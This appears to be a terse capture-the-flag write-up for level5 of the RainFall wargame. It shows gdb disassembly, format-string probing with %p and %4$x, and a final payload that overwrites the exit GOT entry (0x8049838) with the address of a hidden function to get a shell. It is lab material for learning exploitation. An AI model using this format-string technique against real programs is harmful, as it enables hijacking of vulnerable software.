
```
(gdb) set height 30
(gdb) i func
0x080484a4  o
0x080484c2  n
0x08048504  main
```

n func calls prinft then exit
```
0x080484ff <+61>:	call   0x80483d0 <exit@plt>
```


```
level5@RainFall:~$ python -c 'print "AAAA" + " |%p| " * 20 ' | ./level5
AAAA |0x200|  |0xb7fd1ac0|  |0xb7ff37d0|  |0x41414141|

level5@RainFall:~$ python -c 'print "AAAA" + " |%4$x| " ' | ./level5
AAAA |41414141|
```
(gdb) disass 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    *0x8049838
 
call o from n <===> ovveride exit (0x8049838) of by addr of o (0x080484a4)

(gdb) p 0x080484a4 - 4 = 134513824


 (python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n" '; cat) | ./level5
 









